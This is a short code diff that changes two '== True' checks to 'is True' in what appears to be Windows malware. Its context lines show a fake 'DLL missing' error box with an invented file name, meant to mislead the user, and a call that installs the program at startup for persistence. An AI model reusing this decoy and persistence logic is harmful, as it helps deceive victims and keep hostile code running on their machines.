@@ -59,10 +59,10 @@ except Exception:
 if platform.system() != "Windows":
     exit()
 
-if cc.get_fake_error() == True:
+if cc.get_fake_error() is True:
     ctypes.windll.user32.MessageBoxW(0, "The program can't start because VLg7.ll is missing from your computer. Try reinstalling the program to fix this problem", "DDL missing", 16)
 
-if cc.get_start_up() == True:
+if cc.get_start_up() is True:
     StartUp()
 
 
